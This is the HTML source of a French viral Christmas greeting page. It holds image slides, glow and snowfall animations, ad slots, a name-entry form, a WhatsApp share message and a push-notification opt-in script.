                        <a id="id_custom_lang" href="" class="cross_link hidden">Bahasa Indonesia</a>
                        <a id="fi_custom_lang" href="" class="cross_link hidden">Suomi</a>
                        <a id="pl_custom_lang" href="" class="cross_link hidden">Polski</a>
                        <div class="tenpxtop"></div>

                        <!---La redirection des pages --->
                        <script>
                            $(document).ready(function () {
                                var browser_lang = window.navigator.userLanguage || window.navigator.language;
                                browser_lang = browser_lang.substr(0, 2);
                                var current_url_arr = window.location.href.split('/');
                                var query_string = current_url_arr[current_url_arr.length - 1];
                                var domain = window.location.protocol + "//" + window.location.hostname;
                                var current_locale = 'fr';
                                var check_id = '#' + browser_lang + "_custom_lang";
                                if ($(check_id) !== null && browser_lang != current_locale) {
                                    var updated_url = domain + "/" + browser_lang + "/" + query_string + "&utm_source=" + current_locale + "&utm_medium=" + browser_lang + "&utm_campaign=na";
                                    $(check_id).attr("href", updated_url);
                                    $(check_id).removeClass("hidden");
                                }
                            });
                        </script>

                        <div class="appear  main_msg_top">
                            <img class="p1" alt="" style="width: 80%;" src="../../img/vivenoel/11.png">
                        </div>


                        <div class="figures tenpxtop">
                            <img class="p1" style="width: 90%;" src="../../img/vivenoel/32.png">
                        </div>
                        <style>
                            .mySlides {
                                width: 90%;
                                display: none;
                            }
                        </style>
                        <br>
                        <div class="myslides_div">
                            <div style="display: block;text-align: -webkit-center; height: 300px; overflow: hidden;">
                                <img class="mySlides p3" style="max-height: 300px; display: none;"
                                     src="../../img/vivenoel/15.png">
                                <img class="mySlides p3" style="max-height: 300px; display: block;"
                                     src="../../img/vivenoel/16.png">
                                <img class="mySlides p3" style="max-height: 300px; display: none;"
                                     src="../../img/vivenoel/22.jpg">
                                <img class="mySlides p3" style="max-height: 300px; display: none;"
                                     src="../../img/vivenoel/23.jpg">
                            </div>
                        </div>
                        <style>
                            .img_set {
                                width: 44%;
                                height: 25%;
                                animation: pulse 1.5s infinite;
                            }
                        </style>
                        <div class="tenpxtop tenpxbottom twoimageset" style="display: inline-block;">
                            <img class="img_set p3" src="../../img/vivenoel/12.gif">
                            <img class="img_set p3" src="../../img/vivenoel/13.gif">
                        </div>

                        <p class="main-msg white fivepxbottom">
                            <span style="color: #f8c804;font-weight:800;">Noël et le nouvel An sont faits pour passer des moments en famille et entre amis.</span><br>
                            <span style="color: #78ff00;font-weight:800;">Ce sont des moments pour créer de joyeux souvenirs qui dureront toute une vie.</span><br>
                        </p>
                        <div class="fivepxtop main-msg white">
                            <span style="text-shadow: 1px 1px 3px #ff0037, 1px 1px 3px #ff0037, -1px -1px 3px #ff0037, -1px -1px 3px #ff0037;color: #FFC107;">Joyeux Noël!!</span>
                        </div>
                        <style>
                            .ltrmarquee {
                                font-size: 30px;
                                font-weight: 600;
                                display: inline;
                                padding: 10px;
                                color: #efbf09 !important;
                            }

                            .ltrmarquee_bg {
                                border-radius: 20px;
                                background-color: ;
                            }
                        </style>
                        <marquee class="ltrmarquee_bg">
                            <p class="ltrmarquee"><i><span class="user_name">marius</span> te-souhaite <span
                                            style="text-shadow: 1px 1px 3px #ff0037, 1px 1px 3px #ff0037, -1px -1px 3px #ff0037, -1px -1px 3px #ff0037;color: #FFC107;">Joyeux Noël!!</span></i>
                            </p>
                        </marquee>
                        <style>
                            .glow {
                                -webkit-animation: glowing 1500ms infinite !important;
                                -moz-animation: glowing 1500ms infinite !important;
                                -o-animation: glowing 1500ms infinite !important;
                                animation: glowing 1500ms infinite !important;
                                width: fit-content;
                                margin-left: auto;
                                margin-right: auto;
                                padding: 8px;
                                border-radius: 20px;
                            }

                            @-webkit-keyframes glowing {
                                0% {
                                    background-color: #B20000;
                                    -webkit-box-shadow: 0 0 3px #B20000;
                                }
                                50% {
                                    background-color: #FF0000;
                                    -webkit-box-shadow: 0 0 40px #FF0000;
                                }
                                100% {
                                    background-color: #B20000;
                                    -webkit-box-shadow: 0 0 3px #B20000;
                                }
                            }

                            @-moz-keyframes glowing {
                                0% {
                                    background-color: #B20000;
                                    -moz-box-shadow: 0 0 3px #B20000;
                                }
                                50% {
                                    background-color: #FF0000;
                                    -moz-box-shadow: 0 0 40px #FF0000;
                                }
                                100% {
                                    background-color: #B20000;
                                    -moz-box-shadow: 0 0 3px #B20000;
                                }
                            }

                            @-o-keyframes glowing {
                                0% {
                                    background-color: #B20000;
                                    box-shadow: 0 0 3px #B20000;
                                }
                                50% {
                                    background-color: #FF0000;
                                    box-shadow: 0 0 40px #FF0000;
                                }
                                100% {
                                    background-color: #B20000;
                                    box-shadow: 0 0 3px #B20000;
                                }
                            }

                            @keyframes glowing {
                                0% {
                                    background-color: #B20000;
                                    box-shadow: 0 0 3px #B20000;
                                }
                                50% {
                                    background-color: #FF0000;
                                    box-shadow: 0 0 40px #FF0000;
                                }
                                100% {
                                    background-color: #B20000;
                                    box-shadow: 0 0 3px #B20000;
                                }
                            }
                        </style>
                        <br><br>
                        <div class="from jump">
                            <div class="glow">
                                😇 De la part de - <span class="user_name" style="">Nammmme</span> 😇
                            </div>
                        </div>
                        <br>
                        <div class="center ad">
                            <script async=""
                                    src="../../js/vivenoel/adsbygoogle.js"></script>
                            <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-7567244753653428"
                                 data-ad-slot="5990453469" data-ad-format="auto"
                                 data-full-width-responsive="true"></ins>
                            <script>
                                (adsbygoogle = window.adsbygoogle || []).push({});
                            </script>
                        </div>
                        <div class="center ad adpushup_ad_disabled">
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <span id="share" class="share_block">
<span id="" class="float-share hidden" style="">
<a class="btn whatsapp-btn" href="">
<div class="whatsapp-share-text"><b> 👈 Partagez</b></div>
<img class="whatsapp-icon" src="../../img/vivenoel/whatsapp_icon.svg">
</a>
</span>
<div class="name" id="create">
<input class="card-title center-align name head" type="name" required="" id="name"
       style="color: #ffffff; background-color: #c71515" placeholder="Écrivez votre nom">
<a href="javascript:void(0)" class="go" id="gobtn1" style="background-color: #c71515">Soumettre 🙌</a>
</div>
</span>

</div>

<footer>
    <script>
        var count_down_date = 'Dec 25, 2020';
        var enter_name = 'Écrivez votre nom';

        var enter_wish = 'Partagez 👇👇👇👇';
        var whatsapp_msg = '&quot;\ud83d\ude4c Une surprise sp\u00e9ciale pour toi de la part de \ud83d\udc49 *nammmmeeeeee* \ud83d\udc48 %0AClique sur la ligne bleue pour voir %0A\u203c\ufe0f\ud83d\udc47\ud83d\udc47\ud83d\udc47\ud83d\udc47\u203c\ufe0f%0A &quot;'.replace(/(&quot\;)/g, "");

        var time = {"days": 'Jours', "hrs": 'Hrs', "mins": 'Min', "sec": 'Sec'};
    </script>
    <script>
        var analytics = '130498118';
        var locale = 'fr';
    </script>
    <script src="../../js/vivenoel/gaevent.js?v=2"></script>
    <script src="../../js/vivenoel/festival.js?f=41"></script>
    <script src="../../js/vivenoel/hoped.min.js" async=""></script>
    <script>
        var snowfall_images_tmp = '../../img/vivenoel/snowflake.png##../../img/vivenoel/star4.svg##../../img/vivenoel/star5.svg##../../img/vivenoel/star6.svg';
        var snowfall_images = snowfall_images_tmp.split("##");

        window.onload = function () {
            $('body').wpSuperSnow({
                flakes: snowfall_images,
                totalFlakes: '35',
                zIndex: '9',
                maxSize: '95',
                maxDuration: '40',
                useFlakeTrans: true
            });
        };
    </script>
    <script src="../../js/vivenoel/app.js"></script>

    <!--Gestion des cookies -->
    <script>
        if (getCookie('visited') != '' && getCookie('visited') > 4) {
            var truepush = window.truepush || [];
            truepush.push(function () {
                truepush.Init({
                    id: "5ec8fb865558cfe7cca43484"
                }, function (error) {
                    // if(error) console.error(error);
                });
            });
            truepush.push({
                operation: "add-tags",
                data: [{tagName: "locale", tagType: "string", tagValue: "fr"}, {
                    tagName: "domain",
                    tagType: "string",
                    tagValue: "https://private-message.site"
                }],
                callback: function (error, response) {
                    // console.log(error,response);
                }
            });
        }
    </script>
</footer>

<div class="wp-super-snow-flake"
     style="width: 59px; height: 59px; position: fixed; z-index: 9; left: 63%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 21s ease 0s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star6.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.1;"></div>
<div class="wp-super-snow-flake"
     style="width: 81px; height: 81px; position: fixed; z-index: 9; left: 4%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 21s ease 0s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/snowflake.png" style="width: 100%; height: auto; border: 0px; opacity: 0.2;"></div>
<div class="wp-super-snow-flake"
     style="width: 26px; height: 26px; position: fixed; z-index: 9; left: 27%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 10s ease 1s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star5.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.8;"></div>
<div class="wp-super-snow-flake"
     style="width: 65px; height: 65px; position: fixed; z-index: 9; left: 90%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 21s ease 1s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star5.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.7;"></div>
<div class="wp-super-snow-flake"
     style="width: 94px; height: 94px; position: fixed; z-index: 9; left: 23%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 21s ease 2s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star4.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.8;"></div>
<div class="wp-super-snow-flake"
     style="width: 51px; height: 51px; position: fixed; z-index: 9; left: 88%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 21s ease 2s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star5.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.8;"></div>
<div class="wp-super-snow-flake"
     style="width: 19px; height: 19px; position: fixed; z-index: 9; left: 84%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 11s ease 3s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star6.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.6;"></div>
<div class="wp-super-snow-flake"
     style="width: 29px; height: 29px; position: fixed; z-index: 9; left: 54%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 30s ease 3s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star4.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.7;"></div>
<div class="wp-super-snow-flake"
     style="width: 93px; height: 93px; position: fixed; z-index: 9; left: 54%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 14s ease 4s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star5.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.5;"></div>
<div class="wp-super-snow-flake"
     style="width: 56px; height: 56px; position: fixed; z-index: 9; left: 27%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 24s ease 5s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/snowflake.png" style="width: 100%; height: auto; border: 0px; opacity: 0.6;"></div>
<div class="wp-super-snow-flake"
     style="width: 71px; height: 71px; position: fixed; z-index: 9; left: 87%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 15s ease 6s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star4.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.8;"></div>
<div class="wp-super-snow-flake"
     style="width: 9px; height: 9px; position: fixed; z-index: 9; left: 10%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 38s ease 7s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star4.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.3;"></div>
<div class="wp-super-snow-flake"
     style="width: 33px; height: 33px; position: fixed; z-index: 9; left: 10%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 12s ease 8s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star4.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.9;"></div>
<div class="wp-super-snow-flake"
     style="width: 49px; height: 49px; position: fixed; z-index: 9; left: 70%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 37s ease 9s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star5.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.3;"></div>
<div class="wp-super-snow-flake"
     style="width: 56px; height: 56px; position: fixed; z-index: 9; left: 17%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 28s ease 10s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star4.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.1;"></div>
<div class="wp-super-snow-flake"
     style="width: 64px; height: 64px; position: fixed; z-index: 9; left: 33%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 35s ease 4s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/snowflake.png" style="width: 100%; height: auto; border: 0px; opacity: 0.8;"></div>
<div class="wp-super-snow-flake"
     style="width: 33px; height: 33px; position: fixed; z-index: 9; left: 37%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 24s ease 0s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star4.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.5;"></div>
<div class="wp-super-snow-flake"
     style="width: 16px; height: 16px; position: fixed; z-index: 9; left: 72%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 18s ease 3s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star5.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.8;"></div>
<div class="wp-super-snow-flake"
     style="width: 25px; height: 25px; position: fixed; z-index: 9; left: 58%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 24s ease 3s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star6.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.8;"></div>
<div class="wp-super-snow-flake"
     style="width: 29px; height: 29px; position: fixed; z-index: 9; left: 22%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 12s ease 0s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star4.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.9;"></div>
<div class="wp-super-snow-flake"
     style="width: 34px; height: 34px; position: fixed; z-index: 9; left: 29%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 38s ease 2s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/snowflake.png" style="width: 100%; height: auto; border: 0px; opacity: 0.6;"></div>
<div class="wp-super-snow-flake"
     style="width: 40px; height: 40px; position: fixed; z-index: 9; left: 75%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 32s ease 3s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star4.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.7;"></div>
<div class="wp-super-snow-flake"
     style="width: 20px; height: 20px; position: fixed; z-index: 9; left: 59%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 20s ease 4s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star4.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.3;"></div>
<div class="wp-super-snow-flake"
     style="width: 9px; height: 9px; position: fixed; z-index: 9; left: 66%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 20s ease 3s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star6.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.5;"></div>
<div class="wp-super-snow-flake"
     style="width: 69px; height: 69px; position: fixed; z-index: 9; left: 31%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 23s ease 1s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star6.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.9;"></div>
<div class="wp-super-snow-flake"
     style="width: 90px; height: 90px; position: fixed; z-index: 9; left: 28%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 9s ease 1s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star5.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.8;"></div>
<div class="wp-super-snow-flake"
     style="width: 8px; height: 8px; position: fixed; z-index: 9; left: 25%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 14s ease 0s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star6.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.1;"></div>
<div class="wp-super-snow-flake"
     style="width: 51px; height: 51px; position: fixed; z-index: 9; left: 36%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 16s ease 3s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star5.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.5;"></div>
<div class="wp-super-snow-flake"
     style="width: 59px; height: 59px; position: fixed; z-index: 9; left: 5%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 25s ease 0s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star5.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.6;"></div>
<div class="wp-super-snow-flake"
     style="width: 78px; height: 78px; position: fixed; z-index: 9; left: 69%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 38s ease 7s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/star6.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.1;"></div>
<div class="wp-super-snow-flake"
     style="width: 65px; height: 65px; position: fixed; z-index: 9; left: 36%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 40s ease 8s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star6.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.1;"></div>
<div class="wp-super-snow-flake"
     style="width: 79px; height: 79px; position: fixed; z-index: 9; left: 94%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 40s ease 5s infinite normal none running wpSuperSnowFlake_r;">
    <img src="../../img/vivenoel/snowflake.png" style="width: 100%; height: auto; border: 0px; opacity: 0.1;"></div>
<div class="wp-super-snow-flake"
     style="width: 32px; height: 32px; position: fixed; z-index: 9; left: 50%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 32s ease 3s infinite normal none running wpSuperSnow_r;">
    <img src="../../img/vivenoel/star5.svg" style="width: 100%; height: auto; border: 0px; opacity: 0.5;"></div>
<div class="wp-super-snow-flake"
     style="width: 76px; height: 76px; position: fixed; z-index: 9; left: 39%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 37s ease 7s infinite normal none running wpSuperSnow_l;">
    <img src="../../img/vivenoel/snowflake.png" style="width: 100%; height: auto; border: 0px; opacity: 0.3;"></div>
<div class="wp-super-snow-flake"
     style="width: 67px; height: 67px; position: fixed; z-index: 9; left: 46%; top: -200px; opacity: 0; user-select: none; backface-visibility: visible; animation: 39s ease 0s infinite normal none running wpSuperSnowFlake_r;">
    <img src="../../img/vivenoel/snowflake.png" style="width: 100%; height: auto; border: 0px; opacity: 0.4;"></div>
</body>
</html>